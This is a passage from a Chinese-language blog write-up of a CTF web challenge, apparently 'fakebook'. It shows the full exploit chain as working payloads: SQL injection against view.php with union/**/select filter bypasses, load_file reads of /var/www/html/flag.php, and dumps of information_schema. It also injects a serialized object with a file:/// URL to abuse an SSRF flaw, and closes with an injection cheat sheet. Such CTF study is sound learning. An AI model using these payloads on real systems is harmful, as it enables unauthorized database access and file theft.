是一个UserInfo类，类对象有三个属性：name,age,blog。其余的部分有两个函数特殊些，一个get，一个isValidBlog。get方法通过curl发送请求（curl是一个利用url语法工作的传输工具，此例中的使用，即获得指定url的页面内容。详细内容，请自行查阅补充），且并未对参数url进行过滤，这种不对用户可控参数过滤的，我们就要重点对待下。isValidBlog函数是对blog参数进行的正则匹配，猜测对用户的输入格式进行了一定的限制。（getBlogContents函数调用了get函数，同样需要关注。）

发现其中Get()方法并没有对获取过来的url进行任何的过滤，所以这里存在SSRF(服务端请求伪造)漏洞。

对于有登录，有注册的例题，我们要习惯性的尝试下弱口令。结果全部弹窗提示“login failed”，换注册窗口，注册登录。整个页面除了蓝色用户名可以点击之外，没什么有价值的东西。

查看下源码你会发现，最下面是个iframe。iframe的内容通过data伪协议获取，此处data协议的使用格式为：

    data:text/html;base64,<base64编码的HTML代码>

如果我们想办法让data协议后面接上flag.php的内容，是不是就能达到显示目的了。同时也来了两个问题：一，flag文件的路径并不清楚，通过扫描，我们只晓得它和主页面在同一目录下。二、如何将内容添加到data协议后面。

    /view.php?no=1

整个页面还剩一个点，就是这个no参数：把它换成0或者换成2，页面返回全部报错。但获得了重要信息，路径。确定一点flag文件路径为：/var/www/html/flag.php。

存在sql注入

    /view.php?no=1 and 1=1 #

order by 4 # 正常显示， order by 5 # 页面报错，判断有四列

    /view.php?no=1 order by 4 #
    /view.php?no=1 order by 5 #

判断显示位,返回no hack ~_~，说明有过滤

    /view.php?no=1 union select 1,2,3,4 #

使用内联注释绕过。union/**/select绕过，发现username处显示出来了2，其余地方为反序列化失败。

    /view.php?no=-6 union/**/select 1,2,3,4#

    Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31

所以先在username处将数据带出，得到用户是root@localhost ，database为fakebook

    /view.php?no=-6 union/**/select 1,user(),3,4#
    /view.php?no=-6 union/**/select 1,database(),3,4#

先抛开数据库名fakebook不说，这个root用户着实吓了一跳，权限之高，亮瞎狗眼。mysql中的load_file函数，允许访问系统文件，并将内容以字符串形式返回，不过需要的权限很高，且函数参数要求文件的绝对路径。这巧了不是，条件全都有。

payload:

    /view.php?no=-6/**/union/**/select 1,load_file("/var/www/html/flag.php"),3,4

查看源码获得flag

但会发现，前面搜集的好多点全部没用到，尤其是那个严重可疑的iframe，继续尝试注入。

不用load_file，继续注入下去。现在已经拿到了数据库名：fakebook，接下来拿表名：

爆表名，得到表名为users

    /view.php?no=-6 union/**/select 1,(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA="fakebook"),3,4#

爆列名，得到列名为no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS 。明显no，username，passwd为账号基本信息，后面有几个未知字段，猜测是系统变量。

    /view.php?no=-6 union/**/select 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'users'),3,4#

我们知道最开始注册的no为1，username和passwd也都知道是什么，唯独data字段的信息不明确，拿出来看看吧。

    /view.php?no=-6 union/**/select 1,group_concat(username,passwd,data),3,4 from users where no=1#

爆字段，结果是个序列化后的UserInfo对象，这和我们最开始得到的那个备份文件契合了。
    
    O:8:"UserInfo":3:{s:4:"name";s:9:"123123123";s:3:"age";i:12;s:4:"blog";s:20:"http://123123123.com";} 

接下来的东西，我认为需要猜。最开始时的用户页面no=1时，页面返回用户的用户名、密码、博客之类的消息。毫无疑问，页面是根据users表中no=1的这条数据，渲染的页面。因为回显，我们只证明了查询语句的第二个字段是username。其余三个字段并不明确，但我们可以猜测，应该和数据库表中的字段顺序相似。第四个字段应该就是data，而我们现在有一个现成的data数据，

大概的思路为，我们输入的信息被保存为序列化，读取的时候会从数据库中取出并反序列化，然后显示在blog界面。 、

function get($url)获取的blog连接，如果连接失败就404，否则读取文件信息。

所以我们可以通过反序列化来实现ssrf读取任意文件，构造我们想要的路径，然后为了绕过正则，不从注册登录的地方下手，直接人为构造联合查询返回语句，data字段在第四个位置。

我们构造序列化的UserInfo实例，blog内使用file:///读取服务器端flag.php的文本内容

    /view.php?no=-6/**/union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}' 
    
用file伪协议读取flag内容交给blog参数，然后你再查看源码，iframe的src就发生了变化，base64解码后得到flag值

写在后面，因为手工sql注入不是特别的熟练，所以在此记录一下：

    1.爆数据库： group_concat(schema_name) from information_schema.schemata

    2.表名 group_concat(table_name) from information_schema.tables where table_schema="前面查出来的"

    3.字段 group_concat(column_name) from information_schema.columns where table_schema="前面查出来的"

    4.内容 group_concat(xxx) from 表名.字段

绕过union select 过滤方法：

    1./**/ union /**/ select

    2.un<>ion sel<>ect

    3. %55NiOn  %53eLEct



</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">MambaInVeins</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mambainveins.gitee.io/mambainveins/2020/08/04/2020/08/2020-08-04-CTF_world_web_advance_2/">http://mambainveins.gitee.io/mambainveins/2020/08/04/2020/08/2020-08-04-CTF_world_web_advance_2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mambainveins.gitee.io/mambainveins" target="_blank">MambaInVeins Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0189.png" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/08/04/2020/08/2020-08-04-CTF_world_web_advance_10/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0436.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CTF攻防世界 web进阶题 xx-xx</div></div></a></div><div class="next-post pull-right"><a href="/2020/08/03/2020/08/2020-08-03-CTF_world_web_advance/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0063.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CTF攻防世界 web进阶题 1-10</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2020/08/04/2020/08/2020-08-04-CTF_world_web_advance_10/" title="CTF攻防世界 web进阶题 xx-xx"><img class="cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0436.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-04</div><div class="title">CTF攻防世界 web进阶题 xx-xx</div></div></a></div><div><a href="/2020/08/18/2020/08/2020-08-18-CTF_world_pwn_newbee_level0/" title="CTF攻防世界 pwn新手题 level0(ret2text)"><img class="cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0376.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-18</div><div class="title">CTF攻防世界 pwn新手题 level0(ret2text)</div></div></a></div><div><a href="/2020/08/18/2020/08/2020-08-18-CTF_world_pwn_newbee_level2/" title="CTF攻防世界 pwn新手题 level2(ret2libc)"><img class="cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0304.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-18</div><div class="title">CTF攻防世界 pwn新手题 level2(ret2libc)</div></div></a></div><div><a href="/2020/08/18/2020/08/2020-08-18-CTF_world_pwn_newbee_when_did_you_born/" title="CTF攻防世界 pwn新手题 when_did_you_born"><img class="cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0001.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-18</div><div class="title">CTF攻防世界 pwn新手题 when_did_you_born</div></div></a></div><div><a href="/2020/08/18/2020/08/2020-08-18-pwn_study/" title="pwn入门"><img class="cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0046.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-18</div><div class="title">pwn入门</div></div></a></div><div><a href="/2020/08/19/2020/08/2020-08-19-pwntools_install/" title="安装pwntools"><img class="cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0263.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-19</div><div class="title">安装pwntools</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/MambaInVeins.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">MambaInVeins</div><div class="author-info__description">身体和灵魂总有一个在路上</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">248</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">82</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">28</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mambainveins"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/mambainveins" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:mambainveins@protonmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的小站，博客正在迁移中。</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/02/12/2022/2022-02-12-ubuntu_ssh/" title="ubuntu开启ssh服务"><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0020.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ubuntu开启ssh服务"/></a><div class="content"><a class="title" href="/2022/02/12/2022/2022-02-12-ubuntu_ssh/" title="ubuntu开启ssh服务">ubuntu开启ssh服务</a><time datetime="2022-02-11T16:00:00.000Z" title="发表于 2022-02-12 00:00:00">2022-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/14/2021/2021-09-14-mi6root/" title="小米6完全root"><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0307.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="小米6完全root"/></a><div class="content"><a class="title" href="/2021/09/14/2021/2021-09-14-mi6root/" title="小米6完全root">小米6完全root</a><time datetime="2021-09-13T16:00:00.000Z" title="发表于 2021-09-14 00:00:00">2021-09-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/22/2021/2021-08-22-HWS-2021-shop/" title="HWS-2021-PWN-shop"><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0115.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HWS-2021-PWN-shop"/></a><div class="content"><a class="title" href="/2021/08/22/2021/2021-08-22-HWS-2021-shop/" title="HWS-2021-PWN-shop">HWS-2021-PWN-shop</a><time datetime="2021-08-21T16:00:00.000Z" title="发表于 2021-08-22 00:00:00">2021-08-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/21/2021/2021-08-21-pwn_patchelf/" title="pwn更换目标程序libc —— patchelf的使用"><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0383.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn更换目标程序libc —— patchelf的使用"/></a><div class="content"><a class="title" href="/2021/08/21/2021/2021-08-21-pwn_patchelf/" title="pwn更换目标程序libc —— patchelf的使用">pwn更换目标程序libc —— patchelf的使用</a><time datetime="2021-08-20T16:00:00.000Z" title="发表于 2021-08-21 00:00:00">2021-08-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/15/2021/2021-08-15-HWS_PWN/" title="HWS PWN"><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0077.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HWS PWN"/></a><div class="content"><a class="title" href="/2021/08/15/2021/2021-08-15-HWS_PWN/" title="HWS PWN">HWS PWN</a><time datetime="2021-08-14T16:00:00.000Z" title="发表于 2021-08-15 00:00:00">2021-08-15</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0189.png)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By MambaInVeins</div><div class="footer_custom_text"><a href="http://mambainveins.gitee.io/">Mamba Never Out</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script>(function(){
  const bp = document.createElement('script');
  const curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else{
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  bp.dataset.pjax = ''
  const s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})()</script></div></body></html>